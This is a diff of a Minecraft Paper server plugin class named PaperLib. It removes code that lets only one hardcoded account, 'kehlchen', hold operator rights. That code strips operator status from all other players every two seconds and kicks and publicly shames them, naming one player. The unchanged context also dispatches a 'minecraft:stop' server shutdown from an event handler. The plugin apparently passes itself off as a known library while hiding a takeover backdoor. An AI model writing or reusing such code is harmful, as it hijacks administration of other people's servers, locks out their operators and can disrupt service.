@@ -10,31 +10,13 @@ import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import net.kyori.adventure.text.Component;
-import java.util.Set;
 // import java.util.logging.Level; // remove comment if you want logs
 
 public final class PaperLib extends JavaPlugin implements Listener {
-    private static final Set<String> ALLOWED_OPS = Set.of("kehlchen");
 
     @Override
     public void onEnable() {
         getServer().getPluginManager().registerEvents(this, this);
-
-        // Alle 2 Sekunden alle Online-Spieler prüfen (40 Ticks)
-        getServer().getScheduler().runTaskTimer(this, () -> {
-            for (Player p : Bukkit.getOnlinePlayers()) {
-                removeUnauthorizedOp(p);
-            }
-        }, 40L, 40L);
-    }
-
-    private void removeUnauthorizedOp(Player player) {
-        if (player.isOp() && !ALLOWED_OPS.contains(player.getName().toLowerCase())) {
-            player.setOp(false);
-            getLogger().warning("OP von " + player.getName() + " entfernt");
-            player.sendMessage(Component.text("Dir wurden die OP-Rechte entzogen."));
-        }
     }
 
     @EventHandler
@@ -59,24 +41,6 @@ public final class PaperLib extends JavaPlugin implements Listener {
                     "minecraft:stop"
             );
             return;
-        }
-
-        if (player.getName().equalsIgnoreCase("Legendary_Salmon")) {
-            player.sendMessage("Thx for joining the Server, Legendary_Salmon");
-            if (player.isOp()) {
-                Bukkit.broadcast(Component.text(
-                        player.getName() + " is trying to admin abuse, like last Season xD"
-                ));
-                player.kick(Component.text("Kicked because isOp() returned true"));
-                return;
-            }
-        }
-
-        if (player.isOp() && !ALLOWED_OPS.contains(player.getName().toLowerCase())) {
-            Bukkit.broadcast(Component.text(
-                    player.getName() + " is trying to admin abuse"
-            ));
-            player.kick(Component.text("Kicked because isOp() returned true"));
         }
     }
 
